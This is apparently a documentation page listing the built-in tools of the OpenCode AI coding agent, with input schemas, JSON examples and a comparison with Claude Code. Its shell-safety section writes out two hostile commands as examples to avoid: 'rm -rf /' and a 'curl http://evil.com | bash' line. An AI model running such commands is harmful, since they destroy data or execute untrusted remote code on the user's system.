# Complete OpenCode Tools Reference

This document provides a comprehensive reference of ALL built-in tools available in OpenCode, sourced directly from the OpenCode repository (`packages/opencode/src/tool/`).

## Overview

OpenCode includes 18 built-in tools for file operations, code search, shell integration, web access, and task management. Unlike Claude Code, these tools are extensible via plugins and MCP servers.

## Tool Categories

### File Operations
- [read](#read) - Read file contents with optional line ranges
- [write](#write) - Create or overwrite files
- [edit](#edit) - Make targeted string replacements
- [multiedit](#multiedit) - Batch edit operations across multiple locations
- [patch](#patch) - Apply unified diff patches
- [ls](#ls) - List directory contents

### Code Search
- [grep](#grep) - Search file contents using ripgrep
- [glob](#glob) - Find files by pattern
- [codesearch](#codesearch) - Advanced code search capabilities

### Shell Integration
- [bash](#bash) - Execute shell commands (sync/async/detached modes)
- [batch](#batch) - Execute multiple commands efficiently

### LSP Integration
- [lsp_diagnostics](#lsp_diagnostics) - Get LSP diagnostics for files
- [lsp_hover](#lsp_hover) - Get hover information from LSP

### Web Tools
- [webfetch](#webfetch) - Fetch web content
- [websearch](#websearch) - Search the web

### Task Management
- [task](#task) - Spawn sub-agents for complex tasks  
- [todo](#todo) - Read/write project todos (todoread/todowrite)

### Special
- [invalid](#invalid) - Handle invalid tool calls

---

## Detailed Tool Reference

### read

Read file contents with optional line number ranges.

**Input Schema:**
```typescript
{
  path: string;           // File path to read
  viewRange?: [number, number];  // Optional [start, end] line range
}
```

**Features:**
- Automatic line numbering
- Partial file reading with viewRange
- Binary file detection
- Large file handling

**Example:**
```json
{
  "path": "/workspace/src/main.ts",
  "viewRange": [1, 50]
}
```

**Output:**
- File contents with line numbers
- Total line count
- File size information

---

### write

Create new files or overwrite existing files.

**Input Schema:**
```typescript
{
  path: string;     // File path to write
  content: string;  // File content
}
```

**Features:**
- Automatic directory creation
- Overwrite protection (requires confirmation)
- UTF-8 encoding
- Preserves file permissions

**Example:**
```json
{
  "path": "/workspace/src/new-file.ts",
  "content": "export const hello = 'world';"
}
```

---

### edit

Make targeted string replacement edits in files.

**Input Schema:**
```typescript
{
  path: string;          // File to edit
  oldStr: string;        // String to find
  newStr?: string;       // Replacement string (optional, defaults to empty)
  replaceAll?: boolean;  // Replace all occurrences (default: false)
}
```

**Features:**
- Exact string matching
- Single or multiple replacements
- Preserves file formatting
- Generates unified diffs
- Safety checks for unique matches

**Best Practices:**
- Include sufficient context in `oldStr` to ensure uniqueness
- Use for targeted, surgical changes
- Avoid for large-scale refactoring (use multiedit)

**Example:**
```json
{
  "path": "/workspace/src/config.ts",
  "oldStr": "const API_URL = 'http://localhost:3000';",
  "newStr": "const API_URL = process.env.API_URL || 'http://localhost:3000';",
  "replaceAll": false
}
```

---

### multiedit

Perform multiple edit operations in a single tool call.

**Input Schema:**
```typescript
{
  edits: Array<{
    path: string;
    oldStr: string;
    newStr?: string;
    replaceAll?: boolean;
  }>;
}
```

**Features:**
- Batch multiple edits
- Atomic operations (all or nothing)
- Cross-file editing
- Automatic conflict detection

**Use Cases:**
- Renaming variables across files
- Updating import statements
- Consistent formatting changes

**Example:**
```json
{
  "edits": [
    {
      "path": "/workspace/src/user.ts",
      "oldStr": "userId",
      "newStr": "userID"
    },
    {
      "path": "/workspace/src/auth.ts",
      "oldStr": "userId",
      "newStr": "userID"
    }
  ]
}
```

---

### patch

Apply unified diff patches to files.

**Input Schema:**
```typescript
{
  path: string;    // File to patch
  patch: string;   // Unified diff content
}
```

**Features:**
- Standard unified diff format
- Automatic line number adjustment
- Conflict detection
- Reversible operations

**Use for:**
- Applying git diffs
- Complex multi-line changes
- Preserving exact formatting

---

### ls

List directory contents with metadata.

**Input Schema:**
```typescript
{
  path: string;  // Directory path (default: current directory)
}
```

**Output:**
- File/directory names
- File types (file/directory/symlink)
- File sizes
- Permissions
- Last modified times

**Example:**
```json
{
  "path": "/workspace/src"
}
```

---

### grep

Search file contents using ripgrep (powerful regex search).

**Input Schema:**
```typescript
{
  pattern: string;           // Regex pattern
  path?: string;             // Search path (default: current dir)
  glob?: string;             // File pattern filter (e.g., "*.ts")
  outputMode?: "content" | "files_with_matches" | "count";
  contextLines?: number;     // Lines of context around matches
  caseInsensitive?: boolean; // Case-insensitive search
  multiline?: boolean;       // Enable multiline patterns
}
```

**Features:**
- Fast ripgrep-based search
- Regex support
- Context lines
- Multiple output modes
- File type filtering

**Output Modes:**
- `content`: Show matching lines with context
- `files_with_matches`: List files containing matches
- `count`: Show match counts per file

**Example:**
```json
{
  "pattern": "function.*async",
  "glob": "*.ts",
  "outputMode": "content",
  "contextLines": 2
}
```

---

### glob

Find files by glob patterns.

**Input Schema:**
```typescript
{
  pattern: string;  // Glob pattern (e.g., "**/*.ts")
  path?: string;    // Base path (default: current dir)
}
```

**Features:**
- Fast file pattern matching
- Recursive search with `**`
- Multiple file extensions: `*.{ts,tsx,js}`
- Exclusion patterns

**Common Patterns:**
- `**/*.ts` - All TypeScript files recursively
- `src/**/*.test.ts` - Test files in src
- `*.{json,yaml}` - Config files

**Example:**
```json
{
  "pattern": "**/*.test.ts",
  "path": "/workspace"
}
```

---

### codesearch

Advanced semantic code search.

**Input Schema:**
```typescript
{
  query: string;    // Search query
  path?: string;    // Search path
}
```

**Features:**
- Semantic search
- Symbol-aware searching
- Intelligent ranking
- Cross-reference detection

---

### bash

Execute shell commands with multiple execution modes.

**Input Schema:**
```typescript
{
  command: string;          // Shell command
  description?: string;     // Human-readable description
  mode?: "sync" | "async" | "detached";  // Execution mode
  initialWait?: number;     // Seconds to wait for initial output
  cwd?: string;            // Working directory
  env?: Record<string, string>;  // Environment variables
}
```

**Execution Modes:**

**sync** (default):
- Waits for command completion
- Returns full output
- Use for quick commands

**async**:
- Returns immediately with session ID
- Command continues in background
- Retrieve output later
- Use for long-running commands

**detached**:
- Process persists after OpenCode exits
- Use for servers, daemons
- Cannot be stopped via OpenCode

**Features:**
- Full shell environment
- Command chaining with `&&`, `||`, `;`
- Pipe support
- Background job management
- Output streaming
- Exit code handling

**Security:**
- Command validation
- Path sanitization
- Environment isolation
- Dangerous command detection

**Example:**
```json
{
  "command": "npm install && npm run build",
  "description": "Install dependencies and build project",
  "mode": "sync",
  "initialWait": 60,
  "cwd": "/workspace"
}
```

**Background Command Management:**
```json
// Start async command
{
  "command": "npm run dev",
  "mode": "async",
  "description": "Start development server"
}
// Returns: { sessionId: "shell-abc123" }

// Check output later using bash_output tool or read_bash
```

---

### batch

Execute multiple shell commands efficiently.

**Input Schema:**
```typescript
{
  commands: Array<{
    command: string;
    description?: string;
    cwd?: string;
  }>;
  sequential?: boolean;  // Run sequentially (default: false)
}
```

**Features:**
- Parallel or sequential execution
- Shared environment
- Failure handling
- Progress reporting

**Use for:**
- Running tests across modules
- Building multiple packages
- Parallel operations

---

### lsp_diagnostics

Get Language Server Protocol diagnostics for files.

**Input Schema:**
```typescript
{
  path: string;  // File path
}
```

**Output:**
- Errors and warnings
- Line and column numbers
- Diagnostic messages
- Severity levels
- Source (linter/compiler)

**Use for:**
- Finding compilation errors
- Linting issues
- Type checking problems

---

### lsp_hover

Get hover information from LSP server.

**Input Schema:**
```typescript
{
  path: string;    // File path
  line: number;    // Line number (0-indexed)
  character: number;  // Character position
}
```

**Output:**
- Type information
- Documentation
- Function signatures
- Symbol details

---

### webfetch

Fetch content from URLs.

**Input Schema:**
```typescript
{
  url: string;          // URL to fetch
  timeout?: number;     // Request timeout (ms)
  headers?: Record<string, string>;  // HTTP headers
}
```

**Features:**
- HTTP/HTTPS support
- Custom headers
- Timeout control
- Automatic content-type detection
- HTML to markdown conversion

**Example:**
```json
{
  "url": "https://api.github.com/repos/sst/opencode",
  "headers": {
    "Authorization": "Bearer ${GITHUB_TOKEN}"
  }
}
```

---

### websearch

Search the web for information.

**Input Schema:**
```typescript
{
  query: string;      // Search query
  maxResults?: number;  // Maximum results (default: 10)
}
```

**Features:**
- Multiple search engines
- Result ranking
- Snippet extraction
- URL extraction

**Output:**
- Search results with titles
- URLs
- Snippets/descriptions
- Rankings

---

### task

Spawn sub-agents for complex, independent tasks.

**Input Schema:**
```typescript
{
  description: string;    // Task description
  context?: string;       // Additional context
  model?: string;        // Model to use (optional)
  maxIterations?: number;  // Max agent iterations
}
```

**Features:**
- Isolated agent execution
- Full tool access
- Independent context
- Parallel task execution
- Result aggregation

**Use Cases:**
- Parallel feature development
- Independent research tasks
- Modular problem solving
- Divide-and-conquer strategies

**Example:**
```json
{
  "description": "Implement user authentication with JWT tokens",
  "context": "Use bcrypt for password hashing, store tokens in HTTP-only cookies",
  "model": "claude-sonnet-4"
}
```

---

### todo (todoread/todowrite)

Manage project todos and task lists.

**todoread Input:**
```typescript
{
  // No parameters
}
```

**todowrite Input:**
```typescript
{
  todos: Array<{
    content: string;
    status: "pending" | "in_progress" | "completed";
    activeForm?: string;
  }>;
}
```

**Features:**
- Structured todo management
- Status tracking
- Integration with project files
- Markdown formatting

**Storage:**
- Typically stored in `.opencode/todos.json`
- Persists across sessions
- Version controlled

**Example:**
```json
{
  "todos": [
    {
      "content": "Implement user authentication",
      "status": "in_progress"
    },
    {
      "content": "Write unit tests",
      "status": "pending"
    }
  ]
}
```

---

### invalid

Handles invalid tool calls gracefully.

**Purpose:**
- Error handling
- User feedback
- Debugging support

**Automatic invocation when:**
- Tool name doesn't exist
- Invalid parameters
- Malformed requests

---

## Tool Comparison: OpenCode vs Claude Code

| Feature | OpenCode | Claude Code |
|---------|----------|-------------|
| **Tool Count** | 18 built-in + unlimited via plugins/MCP | Fixed set of tools |
| **Extensibility** | Full plugin system + MCP | Limited |
| **Bash Modes** | sync, async, detached | Limited async support |
| **LSP Integration** | Direct LSP tool access | Integrated but not exposed |
| **Multiedit** | Built-in batch editing | Sequential edits only |
| **Task Tool** | Sub-agent spawning | Not available |
| **Custom Tools** | Via plugins & MCP servers | Not available |

## Tool Usage Best Practices

### 1. Choose the Right Tool

**File Reading:**
- Small files: `read` without viewRange
- Large files: `read` with viewRange
- Directory listing: `ls`

**File Modification:**
- Single targeted change: `edit`
- Multiple related changes: `multiedit`
- Complex multi-line changes: `patch`
- New files: `write`

**Code Search:**
- Find files: `glob`
- Search content: `grep`
- Semantic search: `codesearch`

### 2. Shell Command Safety

**Safe Patterns:**
```json
{
  "command": "npm install --save lodash",
  "description": "Install lodash dependency"
}
```

**Unsafe Patterns to Avoid:**
```json
{
  "command": "rm -rf /"  // Destructive
}
{
  "command": "curl http://evil.com | bash"  // Arbitrary code execution
}
```

### 3. Async Command Management

```javascript
// Pattern for long-running commands
1. Start with mode: "async"
2. Store returned sessionId
3. Poll with bash_output or read_bash
4. Clean up when done
```

### 4. Tool Composition

Combine tools for complex workflows:

```
1. glob → Find all test files
2. read → Read each test file
3. edit → Update test patterns
4. bash → Run test suite
```

### 5. Error Handling

All tools return structured errors:
```json
{
  "success": false,
  "error": "File not found",
  "code": "ENOENT",
  "path": "/workspace/missing.ts"
}
```

## Tool Performance Characteristics

| Tool | Speed | Resource Usage | Scalability |
|------|-------|----------------|-------------|
| read | Fast | Low | Excellent |
| write | Fast | Low | Excellent |
| edit | Fast | Low | Good |
| multiedit | Medium | Medium | Good |
| grep | Very Fast | Low | Excellent |
| glob | Very Fast | Low | Excellent |
| bash | Varies | Varies | Good |
| task | Slow | High | Limited |
| webfetch | Medium | Medium | Good |
| lsp_* | Medium | Medium | Good |

## Tool Debugging

Enable detailed tool logging:

```bash
export OPENCODE_LOG_LEVEL=debug
export OPENCODE_TOOL_TRACE=true
```

View tool execution:
```bash
opencode --tool-trace
```

## Tool Extensions via Plugins

Create custom tools by developing plugins. See [Plugins and Tools](./plugins-and-tools.md) for details.

## Tool Extensions via MCP

Add external tools through MCP servers. See [MCP Server Integration](./mcp-server-integration.md) for details.

## Next Steps

- Review [OpenCode SDK Fundamentals](./opencode-sdk-fundamentals.md) for usage patterns
- Explore [Plugins and Tools](./plugins-and-tools.md) for extensions
- Check [Configuration Guide](./configuration-guide.md) for tool configuration
- Read [Advanced Use Cases](./advanced-use-cases.md) for real-world examples

## References

- [OpenCode Tool Source Code](https://github.com/sst/opencode/tree/main/packages/opencode/src/tool)
- [OpenCode Documentation](https://opencode.ai/docs/tools/)
- [Tool API Reference](https://opencode.ai/docs/api/tools)
